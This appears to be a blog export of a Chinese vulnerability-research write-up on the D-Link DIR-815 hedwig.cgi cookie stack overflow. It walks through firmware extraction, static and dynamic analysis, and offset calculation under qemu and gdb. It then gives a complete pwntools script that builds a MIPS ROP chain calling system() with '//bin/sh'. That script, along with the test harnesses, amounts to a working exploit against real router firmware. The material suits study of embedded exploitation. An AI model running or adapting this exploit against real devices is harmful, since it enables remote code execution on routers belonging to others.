<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>D-LINK DIR-815多次溢出漏洞</title>
      <link href="/2022/08/25/D-LINK%20DIR-815%E5%A4%9A%E6%AC%A1%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/08/25/D-LINK%20DIR-815%E5%A4%9A%E6%AC%A1%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p> 参考：[<a href="https://bbs.pediy.com/thread-268623.htm">原创]家用路由器漏洞挖掘实例分析[图解D-LINK DIR-815多次溢出漏洞]-智能设备-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p><p> 该漏洞的描述位于<a href="https://www.exploit-db.com/exploits/33863">这里</a>，可知漏洞出现在<code>hedwig.cgi</code>文件中，漏洞产生的原因是Cookie的值超长造成缓冲区溢出。首先了解一下<code>cgi</code>文件。</p><blockquote><p><code>cgi(Common Gateway Interface)</code>，通用网关接口。运行在服务器上提供同客户端 HTML 页面的接口的一段程序。</p></blockquote><p>固件下载地址</p><p><a href="http://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/DIR-815_REVA_FIRMWARE_v1.01.ZIP">http://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/DIR-815_REVA_FIRMWARE_v1.01.ZIP</a></p><p>binwalk解压固件</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208142115027.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208142115027.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220814203357076"></p><p>查看<strong>bin&#x2F;busybox</strong>得知是MIPS32，小端：</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208142123921.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208142123921.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220814212350877"></p><h3 id="寻找线索"><a href="#寻找线索" class="headerlink" title="寻找线索"></a>寻找线索</h3><p><code>find . -name &#39;*cgi&#39;</code>查找文件</p><p>并<code>ls -l ./htdocs/web/hedwig.cgi</code>发现hedwig.cgi是指向.&#x2F;htdocs&#x2F;cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。 </p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>IDA静态调试<code>cgibin</code>文件，<code>hedwigcgi_main</code>函数处理整个过程，由于是<code>HTTP_COOK</code>这个字段引起的漏洞溢出点，可以在IDA（SHIFT+F12）搜索字符串，然后通过X，交叉引用来跟踪到<code>hedwigcgi_main</code>函数条用的位置。</p><p>跟踪到主函数的位置hedwigcgi_main，对函数功能进行大致分析，可以定位到其中的<code>sprintf</code>函数引起了栈溢出。调用<code>sess_get_uid</code>，得到<code>HTTP_COOKIE</code>的值。同样创建两个指针数组<code>a1,a2</code>，以等号为界将前半部分存入<code>a1</code>偏移为5处，后半部分存入<code>a2</code>偏移为5处，<code>a1[5]</code>为<code>uid</code>则将<code>a2[5]</code>存入参数指针数组的偏移为5处。函数<code>sobj_get_string</code>获得该数组中指向<code>cookie</code>的指针。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208142209716.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208142209716.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220814220857008"></p><h3 id="IDA动态调试-确定偏移位置"><a href="#IDA动态调试-确定偏移位置" class="headerlink" title="IDA动态调试-确定偏移位置"></a>IDA动态调试-确定偏移位置</h3><p>程序通过 getenv 的方式获取 HTTP 数据包中的数据，流程应该为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主Web程序监听端口-&gt;传送HTTP数据包-&gt;</span><br><span class="line">HTTP中headers等数据通过环境变量的方式传给cgi处理程序-&gt;</span><br><span class="line">cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据</span><br><span class="line">#POST具体数据可以通过类似输入流传入 ：echo &quot;uid=aaa&quot;| /htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure><p>测试脚本test.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意：里面=和变量之间一定不要有空格，坑，否则读入空数据。</span></span><br><span class="line">test=$(python -c &quot;print (&#x27;uid=&#x27;+open(&#x27;content&#x27;,&#x27;r&#x27;).read(2000))&quot;) #方式一，以文件形式读入内容，提前填充好构造的数据到content文件</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">test</span>=$(python -c <span class="string">&quot;print &#x27;uid=&#x27; + &#x27;A&#x27;*0x600&quot;</span> )<span class="comment">#方式二，直接后面接数据内容</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">test</span>=$(python -c <span class="string">&quot;print &#x27;uid=&#x27;+open(&#x27;exploit&#x27;,&#x27;r&#x27;).read()&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">test</span> =$(python -c <span class="string">&quot;print &#x27;uid=&#x27; + &#x27;A&#x27;*1043 + &#x27;B&#x27;*4&quot;</span>)<span class="comment">#可选构造数据</span></span></span><br><span class="line"> </span><br><span class="line">LEN=$(echo -n &quot;$test&quot; | wc -c)    </span><br><span class="line">PORT=&quot;1234&quot;</span><br><span class="line">cp $(which qemu-mipsel-static) ./qemu</span><br><span class="line">sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$test -E REQUEST_URL=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;127.0.0.1&quot; -g $PORT /htdocs/web/hedwig.cgi 2&gt;/dev/null    </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-E参数：加入环境变量 ；2&gt;/dev/null ：不输出提示错误</span></span><br><span class="line">rm -f ./qemu</span><br></pre></td></tr></table></figure><p>利用patternLocOffset.py生成content文件，包含特定格式的2000个字符串。类似于cyclic</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python patternLocOffset.py  -c  -l  2000 -f content</span><br></pre></td></tr></table></figure><p>在0x0409A38处断下</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208151728794.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208151728794.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220815172817801"></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208151730759.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208151730759.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220815173010130"></p><p><code>python patternLocOffset.py -s 0x38694237 -l 2000</code>计算偏移：</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208151731959.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208151731959.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220815173122685"></p><p>跟完<code>sess_get_uid()</code>函数可发现后面还有一个<code>sprintf()</code>，这里也会造成栈溢出，哪到底哪个才是真正的利用点呢</p><p>从整个函数可以看出，<code>fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;)</code>的成功与否会导致程序走向这两个地方，即成功后是第二个<code>sprintf()</code>为溢出利用点，而失败时是第一个<code>sprintf()</code>为溢出利用点</p><p>如果 <code>fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;)</code> 打开成功则会执行到第二个 <code>sprintf</code>，因为没有实机没法判断实际固件中是否有这个目录</p><p>因此我们手动创建该目录及文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir var/tmp</span><br><span class="line">touch var/tmp/temp.xml</span><br></pre></td></tr></table></figure><p>这里假设第二个<code>sprintf()</code>为漏洞点（其实是第一个还是第二个对于用户模式下的调试并没有多大关系，就是偏移不一样罢了，构造 rop 链方法都是一样的），所以偏移得重新计算</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208152108757.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208152108757.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220815210851712"></p><p>但是haystack为0的话无法走到第二个sprintf</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208152113659.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208152113659.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220815211302284"></p><p>交叉引用找到这</p><p>动调可知在sub_402B40函数，这里影响着haystack的赋值</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208152120316.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208152120316.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220815212012503"></p><p>这部分前面的代码，可知随便传点参数即可</p><p>参考<a href="https://lantern.cool/CVE-d-link-dir-815/#%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90">D-Link DIR-815 路由器多次溢出漏洞分析 | Lantern’s 小站</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">test2.sh</span></span><br><span class="line"></span><br><span class="line">INPUT=&quot;x=x&quot;</span><br><span class="line">COOKIE=$(python -c &quot;print(&#x27;uid=&#x27; + open(&#x27;context&#x27;,&#x27;r&#x27;).read())&quot;)</span><br><span class="line">PORT=&quot;1234&quot;</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)</span><br><span class="line">cp $(which qemu-mipsel-static) ./qemu</span><br><span class="line"></span><br><span class="line">echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$COOKIE -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;127.0.0.1&quot;  -g $PORT /htdocs/web/hedwig.cgi</span><br><span class="line">rm -f ./qemu</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208152135723.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208152135723.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220815213512069"></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208152138591.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208152138591.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220815213818996"></p><p>最终的偏移为1009.</p><h3 id="ROP-链的构造"><a href="#ROP-链的构造" class="headerlink" title="ROP 链的构造"></a>ROP 链的构造</h3><h4 id="gdb-multiarch-QEMU动态调试分析验证"><a href="#gdb-multiarch-QEMU动态调试分析验证" class="headerlink" title="gdb-multiarch+QEMU动态调试分析验证"></a>gdb-multiarch+QEMU动态调试分析验证</h4><p>1，通过gdb指定脚本调试（避免重复输入，重复造轮子浪费时间）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">set endian little</span><br><span class="line">target remote :1234</span><br><span class="line">b *0x409a54</span><br><span class="line">c</span><br><span class="line">vmmap</span><br></pre></td></tr></table></figure><p>执行 #一定要加载文件htdocs&#x2F;cgibin不然vmmap得不到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch htdocs/cgibin -x dbgscript</span><br></pre></td></tr></table></figure><p>-x是指定要执行的命令文件</p><p>but…还是每找到完整的vmmap</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208152203888.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208152203888.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220815220331538"></p><p>但实际上，我们查看 <code>lib</code> 目录下的 <code>libc.so.0</code> 即可知</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208152206737.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208152206737.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220815220647414"></p><p>找到systeam的地址</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208241821983.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208241821983.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220824182111945"></p><p>另外一种方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./lib/libuClibc-0.9.30.1.so&quot;</span>)</span><br><span class="line">libc.address = <span class="number">0x77fe2000</span> <span class="comment"># base address rop链的基地址，确定方法在后面</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br></pre></td></tr></table></figure><p>得到 system address: 0x7f78b200</p><p>然后便是找一个能将 <code>system()</code> 首个参数写入 <code>$a0</code> 的 gadget，这里在 <code>libuClibc-0.9.30.1.so</code> 中使用 <code>mipsrop</code> 插件，利用 <code>mipsrop.stackfinder()</code> 命令找将栈上数据放入寄存器的 gadget：</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208241839670.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208241839670.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220824183923389"></p><p>打开 mips rop gadgets</p><p>然后命令行输入mipsrop.stackfinders()</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208241855434.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208241855434.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220824185508259"></p><p>选择0x159cc的指令。该指令序列首先将SP+0x10（动调）地址存入寄存器S5中，而在偏移0x159EO处将$S5作为参数存入 Sa0，也就是说，这里需要将第一步得到的system地址填充到$So中，然后在$SP+0x10处填充需要执行的命令，即可实现对system(“”command”)函数的调用。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208241946485.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208241946485.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220824194631364"></p><p>因为 system地址的最低位为0x00，而在 hedwig_main获取Cookie的过程中，也没有对这部分数据进行解码，所以，试图通过访问 hedwig.cgi时对Cookie进行编码来避开0x00是不可能的，这就使 sprintf函数可能被截断，造成缓冲区溢出失败。为了避开 <code>0x00</code>，写入时- 1  ，后面再找一个 gadget 加一即可</p><p><code>hedwigcgi_main()</code> 结尾部分：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026210355070.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026210355070.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211026210355070"></p><p>修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$s0</span><br><span class="line">$s1</span><br><span class="line">$s2</span><br><span class="line">$s3</span><br><span class="line">$s4</span><br><span class="line">$s5</span><br><span class="line">$s6</span><br><span class="line">$s7</span><br><span class="line">$fp</span><br><span class="line">$ra &lt;== 返回地址</span><br></pre></td></tr></table></figure><p>ROP的思路</p><p><img src="https://bbs.pediy.com/upload/attach/202107/913238_ADR87M9WEJSWMXY.png" class="lazyload" data-srcset="https://bbs.pediy.com/upload/attach/202107/913238_ADR87M9WEJSWMXY.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> MIPSPayload <span class="keyword">import</span> MIPSPayload</span><br><span class="line"><span class="keyword">import</span> string, random, sys</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MIPSPayload</span>:</span><br><span class="line">    BADBYTES = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    LITTLE = <span class="string">&quot;little&quot;</span></span><br><span class="line">    BIG = <span class="string">&quot;big&quot;</span></span><br><span class="line">    FILLER = <span class="string">b&quot;A&quot;</span></span><br><span class="line">    BYTES = <span class="number">4</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, elfbase:<span class="built_in">int</span>, endian:<span class="built_in">str</span> = LITTLE, badbytes: <span class="built_in">bytes</span> = BADBYTES</span>):</span><br><span class="line">        self.elfbase = elfbase</span><br><span class="line">        self.badbytes = badbytes</span><br><span class="line">        self.endian = endian</span><br><span class="line">        self.payload = <span class="built_in">bytes</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rand_text</span>(<span class="params">self, size</span>):</span><br><span class="line">        table = (string.ascii_letters + string.digits).encode()</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(random.choices(table, k=size))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">bytes</span>:</span><br><span class="line">            self.payload += data</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;%s is no support type&quot;</span> % <span class="built_in">type</span>(data))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Address</span>(<span class="params">self, offset, base=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> base <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            base = self.elfbase</span><br><span class="line">        <span class="keyword">return</span> self.ToBytes(base + offset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">AddAddress</span>(<span class="params">self, offset, base=<span class="literal">None</span></span>):</span><br><span class="line">        self.Add(self.Address(offset, base))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ToBytes</span>(<span class="params">self, value, size=BYTES</span>):</span><br><span class="line">        data = [(value &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size)]</span><br><span class="line">        <span class="keyword">if</span> self.endian != self.LITTLE:</span><br><span class="line">            data = data[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">AddNOPs</span>(<span class="params">self, size</span>):</span><br><span class="line">        self.Add(self.rand_text(size))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">AddBuffer</span>(<span class="params">self, size, byte=FILLER</span>):</span><br><span class="line">        self.Add(byte * size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Build</span>(<span class="params">self</span>):</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.payload:</span><br><span class="line">            <span class="keyword">if</span> self.badbytes.find(c) != -<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;Bad byte found in payload at offset %d: 0x%.2X&quot;</span> % (count, c))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self.payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Print</span>(<span class="params">self, bpl = BYTES</span>):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.payload:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line">            sys.stdout.write(<span class="string">&quot;\\x%.2X&quot;</span> % c)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">if</span> bpl &gt; <span class="number">0</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">payload = MIPSPayload(<span class="number">0x7f738000</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./lib/libuClibc-0.9.30.1.so&quot;</span>)</span><br><span class="line">libc.address = <span class="number">0x77fe2000</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br><span class="line">calcsystem = <span class="number">0x158c8</span>    <span class="comment"># $s0 add 1, jalr $s5</span></span><br><span class="line">callsystem = <span class="number">0x159cc</span>    <span class="comment"># cmd -&gt; $a0, jalr $s0 (system_addr)</span></span><br><span class="line"></span><br><span class="line">payload.AddBuffer(<span class="number">0x3CD</span>)                    <span class="comment">#       973</span></span><br><span class="line">payload.AddAddress(system_addr - <span class="number">1</span>)         <span class="comment"># $s0   977</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s1   981</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s2   985</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s3   989</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s4   993                     </span></span><br><span class="line">payload.AddAddress(callsystem)              <span class="comment"># $s5   997</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s6   1001</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s7   1005</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $fp   1009</span></span><br><span class="line">payload.AddAddress(calcsystem)              <span class="comment"># $ra</span></span><br><span class="line">payload.AddBuffer(<span class="number">0x10</span>)                     <span class="comment"># .text:000159CC  addiu   $s5, $sp, 0x170+var_160</span></span><br><span class="line">payload.Add(<span class="string">b&#x27;//bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;exploit&quot;</span>, <span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">f.write(payload.Build())</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h3 id="qemu系统模式"><a href="#qemu系统模式" class="headerlink" title="qemu系统模式"></a>qemu系统模式</h3><p>这里主要是为了在qemu虚拟机中重现http服务。</p><p><code>/sbin/httpd</code>应该是用于监听web端口的http服务，同时查看<code>/htdocs/web</code>文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。</p><p><code>find ./ -name &#39;*http*&#39;</code>找到web配置文件httpcfg.php</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251517131.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251517131.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" 